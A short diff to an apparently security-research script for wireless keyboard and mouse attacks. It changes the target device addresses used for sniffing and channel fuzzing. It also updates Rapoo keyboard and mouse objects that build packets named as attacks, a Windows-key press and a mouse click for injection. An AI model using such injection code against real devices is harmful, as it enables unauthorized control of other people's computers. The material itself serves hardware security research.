@@ -52,8 +52,8 @@ common.parse_and_init()
 ----------------------------Initial analysis----------------------------
 """
 
-#Device.quick_sniff("92:78:79:dc:69", [22, 34, 43, 56, 67, 78], common.RF_RATE_2M, 20)
-Device.fuzz_channels("92:78:79:dc:69", common.RF_RATE_2M)
+#Device.quick_sniff("c7:92:78:79:dc", [22, 26, 34, 38, 43, 47, 56, 60, 67, 71, 78, 82], common.RF_RATE_2M, 21)
+#Device.fuzz_channels("c7:92:78:79:dc", common.RF_RATE_2M)
 
 
 """
@@ -111,8 +111,8 @@ attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="888
 ----------------------------Rapoo----------------------------
 """
 
-rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79:dc:69:06", 0x11021, 0xefdf)
-rapoo_mouse = Rapoo_Mouse("c7:92:78:79:dc:69:04", 0x11021, 0xefdf)
+rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79:dc", 0x11021, 0xefdf)
+rapoo_mouse = Rapoo_Mouse("c7:92:78:79:dc", 0x11021, 0xefdf)
 
 attack_rapoo_keyboard = [
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
@@ -128,7 +128,6 @@ attack_rapoo_keyboard = [
 attack_rapoo_mouse = [
     rapoo_mouse.build_packet([MouseClickType.LEFT_CLICK])
 ]
-
 
 #rapoo_keyboard.sniff()
 #rapoo_mouse.sniff()
